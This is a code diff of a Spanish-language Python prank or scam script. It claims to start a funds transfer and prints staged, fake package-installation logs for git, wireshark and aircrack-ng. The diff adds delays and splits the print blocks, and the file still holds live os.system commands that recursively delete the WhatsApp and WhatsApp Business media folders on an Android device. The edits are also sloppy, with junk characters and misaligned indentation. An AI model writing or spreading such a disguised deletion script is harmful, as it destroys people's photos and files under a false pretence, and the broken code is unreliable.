@@ -27,13 +27,15 @@ def menu():
         print("Éxito")
         time.sleep(1)
         print("Iniciando transferencia de fondos")
+        time.sleep(3)
         print("""Leyendo lista de paquetes... Hecho
 Creando árbol de dependencias... Hecho
 Leyendo la información de estado... Hecho
 Se instalarán los siguientes paquetes adicionales:
   git-man liberror-perl
-Paquetes sugeridos:
-  git-daemon-run | git-daemon-sysvinit git-doc git-el git-email git-gui gitk
+Paquetes sugeridos:""")
+         time.sleep(3)       
+         print(""" git-daemon-run | git-daemon-sysvinit git-doc git-el git-email git-gui gitk
   gitweb git-cvs git-mediawiki git-svn
 Se instalarán los siguientes paquetes NUEVOS:
   git git-man liberror-perl
@@ -44,8 +46,9 @@ Se utilizarán 37,9 MB de espacio de disco adicional después de esta operación
 Des:1 http://deb.debian.org/debian bullseye/main amd64 liberror-perl all 0.17029-1 [31,0 kB]
 Des:2 http://deb.debian.org/debian bullseye/main amd64 git-man all 1:2.30.2-1 [1.827 kB]
 Des:3 http://deb.debian.org/debian bullseye/main amd64 git amd64 1:2.30.2-1 [5.527 kB]
-Descargados 7.386 kB en 1s (5.360 kB/s)
-Seleccionando el paquete liberror-perl previamente no seleccionado.
+Descargados 7.386 kB en 1s 5.360 kBsfsdfsd """)
+        time.sleep(3)
+        print("""Seleccionando el paquete liberror-perl previamente no seleccionado.
 (Leyendo la base de datos ... 186182 ficheros o directorios instalados actualmen
 te.)
 Preparando para desempaquetar .../liberror-perl_0.17029-1_all.deb ...
@@ -58,8 +61,9 @@ Preparando para desempaquetar .../git_1%3a2.30.2-1_amd64.deb ...
 Desempaquetando git (1:2.30.2-1) ...
 Configurando liberror-perl (0.17029-1) ...
 Configurando git-man (1:2.30.2-1) ...
-Configurando git (1:2.30.2-1) ...
-Procesando disparadores para man-db (2.9.4-2) ...
+Configurando git (1:2.30.2-1) ...""")
+        time.sleep(3)
+        print(""" Procesando disparadores para man-db (2.9.4-2) ...
 Leyendo lista de paquetes... Hecho
 Creando árbol de dependencias... Hecho
 Leyendo la información de estado... Hecho
@@ -91,8 +95,9 @@ Des:8 http://deb.debian.org/debian bullseye/main amd64 ieee-data all 20210605.1 
 Des:9 http://deb.debian.org/debian bullseye/main amd64 libbcg729-0 amd64 1.1.1-2 [33,1 kB]
 Des:10 http://deb.debian.org/debian bullseye/main amd64 libc-ares2 amd64 1.17.1-1+deb11u1 [102 kB]
 Des:11 http://deb.debian.org/debian bullseye/main amd64 libhwloc-plugins amd64 2.4.1+dfsg-1 [21,4 kB]
-Des:12 http://deb.debian.org/debian bullseye/main amd64 libsmi2ldbl amd64 0.4.8+dfsg2-16 [123 kB]
-Des:13 http://deb.debian.org/debian bullseye/main amd64 libwireshark-data all 3.4.10-0+deb11u1 [1.575 kB]
+Des:12 http://deb.debian.org/debian bullseye/main amd64 libsmi2ldbl amd64 0.4.8+dfsg2-16 [123 kB] """)
+        time.sleep(3)
+        print("""Des:13 http://deb.debian.org/debian bullseye/main amd64 libwireshark-data all 3.4.10-0+deb11u1 [1.575 kB]
 Des:14 http://deb.debian.org/debian bullseye/main amd64 libwsutil12 amd64 3.4.10-0+deb11u1 [106 kB]
 Des:15 http://deb.debian.org/debian bullseye/main amd64 libwiretap11 amd64 3.4.10-0+deb11u1 [249 kB]
 Des:16 http://deb.debian.org/debian bullseye/main amd64 libwireshark14 amd64 3.4.10-0+deb11u1 [16,0 MB]
@@ -125,8 +130,9 @@ Preparando para desempaquetar .../05-wireless-tools_30~pre9-13.1_amd64.deb ...
 Desempaquetando wireless-tools (30~pre9-13.1) ...
 Seleccionando el paquete aircrack-ng previamente no seleccionado.
 Preparando para desempaquetar .../06-aircrack-ng_1%3a1.6+git20210130.91820bc-1_amd64.deb 
-...
-Desempaquetando aircrack-ng (1:1.6+git20210130.91820bc-1) ...
+...""")
+        time.sleep(3)
+        print("""Desempaquetando aircrack-ng (1:1.6+git20210130.91820bc-1) ...
 Seleccionando el paquete ieee-data previamente no seleccionado.
 Preparando para desempaquetar .../07-ieee-data_20210605.1_all.deb ...
 Desempaquetando ieee-data (20210605.1) ...
@@ -201,7 +207,7 @@ Procesando disparadores para gnome-menus (3.36.0-1) ...
 Procesando disparadores para libc-bin (2.31-13+deb11u2) ...
 Procesando disparadores para man-db (2.9.4-2) ...
 Procesando disparadores para cracklib-runtime (2.9.6-3.4) ...
-skipping line: 1""")
+skipping line: 1 """)
         os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp")
         os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp.w4b")
         time.sleep(8)
